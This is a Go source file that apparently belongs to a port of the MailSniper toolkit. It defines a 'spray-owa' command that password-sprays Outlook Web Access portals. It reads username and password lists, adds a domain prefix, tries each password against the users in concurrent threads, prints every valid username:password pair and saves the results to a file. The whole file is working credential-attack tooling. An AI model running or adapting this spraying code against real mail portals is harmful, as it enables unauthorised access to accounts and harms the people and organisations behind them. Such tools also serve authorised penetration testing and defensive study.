package cmd

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/spf13/cobra"
	"mailsniper-go/internal/output"
	owaClient "mailsniper-go/internal/owa"
)

func newSprayOWACmd() *cobra.Command {
	var (
		hostname     string
		domain       string
		username     string
		userList     string
		password     string
		passwordList string
		threads      int
		outFile      string
		outFmt       string
		skipTLS      bool
		delay        int
		verbose      bool
	)

	cmd := &cobra.Command{
		Use:   "spray-owa",
		Short: "Password spray against OWA (Invoke-PasswordSprayOWA)",
		Long: `Attempts to authenticate to an OWA portal using one or more usernames
and one or more passwords. Passwords are iterated sequentially (lockout-safe);
users are threaded within each password round.

Equivalent to the PowerShell Invoke-PasswordSprayOWA function.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			// Build user list.
			var users []string
			var err error
			if userList != "" {
				users, err = readLines(userList)
				if err != nil {
					return fmt.Errorf("read user list: %w", err)
				}
			} else if username != "" {
				users = []string{username}
			} else {
				return fmt.Errorf("provide --username or --user-list")
			}

			// Prepend domain prefix if --domain is set and username doesn't already have one.
			if domain != "" {
				for i, u := range users {
					if !strings.Contains(u, `\`) && !strings.Contains(u, "@") {
						users[i] = domain + `\` + u
					}
				}
			}

			// Build password list.
			var passwords []string
			if passwordList != "" {
				passwords, err = readLines(passwordList)
				if err != nil {
					return fmt.Errorf("read password list: %w", err)
				}
			} else if password != "" {
				passwords = []string{password}
			} else {
				return fmt.Errorf("provide --password or --password-list")
			}

			fmt.Printf("[*] Loaded %d user(s), %d password(s)\n", len(users), len(passwords))
			fmt.Printf("[*] Spraying OWA at %s\n", hostname)
			if verbose {
				fmt.Printf("[*] Threads: %d | Delay: %dms\n", threads, delay)
			}

			type result struct {
				user     string
				password string
				valid    bool
				err      error
			}

			var allResults []output.SprayResult

			for _, pwd := range passwords {
				if verbose {
					fmt.Printf("[*] Trying password: %s\n", pwd)
				}

				sem := make(chan struct{}, threads)
				resultCh := make(chan result, len(users))
				var wg sync.WaitGroup

				for _, user := range users {
					user := user
					wg.Add(1)
					sem <- struct{}{}
					go func() {
						defer wg.Done()
						defer func() { <-sem }()
						if delay > 0 {
							time.Sleep(time.Duration(delay) * time.Millisecond)
						}
						oc, err := owaClient.NewClient(hostname, skipTLS)
						if err != nil {
							resultCh <- result{user, pwd, false, err}
							return
						}
						ok, err := oc.TryLogin(user, pwd)
						resultCh <- result{user, pwd, ok, err}
					}()
				}
				wg.Wait()
				close(resultCh)

				for r := range resultCh {
					if r.err != nil && verbose {
						fmt.Printf("[-] %s: error: %v\n", r.user, r.err)
					} else if r.valid {
						fmt.Printf("[+] VALID: %s:%s\n", r.user, r.password)
					}
					allResults = append(allResults, output.SprayResult{
						Username: r.user,
						Password: r.password,
						Valid:    r.valid,
					})
				}
			}

			if outFile != "" {
				fmt.Printf("[*] Writing results to %s\n", outFile)
				if err := output.WriteSprayResults(outFile, output.ParseFormat(outFmt), allResults); err != nil {
					return fmt.Errorf("write results: %w", err)
				}
			}
			return nil
		},
	}

	f := cmd.Flags()
	f.StringVar(&hostname, "hostname", "", "OWA server hostname")
	f.StringVar(&domain, "domain", "", "Prepend DOMAIN\\ to usernames that lack a domain prefix")
	f.StringVar(&username, "username", "", "Single username to spray")
	f.StringVar(&userList, "user-list", "", "File with usernames (one per line)")
	f.StringVar(&password, "password", "", "Single password to spray")
	f.StringVar(&passwordList, "password-list", "", "File with passwords to spray (one per line)")
	f.IntVar(&threads, "threads", 5, "Number of concurrent threads")
	f.StringVar(&outFile, "output", "", "Output file path")
	f.StringVar(&outFmt, "output-format", "txt", "Output format: csv, json, txt")
	f.BoolVar(&skipTLS, "skip-tls", false, "Skip TLS certificate verification")
	f.IntVar(&delay, "delay", 0, "Delay between requests per thread (milliseconds)")
	f.BoolVar(&verbose, "verbose", false, "Print each password attempt and errors")

	_ = cmd.MarkFlagRequired("hostname")
	return cmd
}
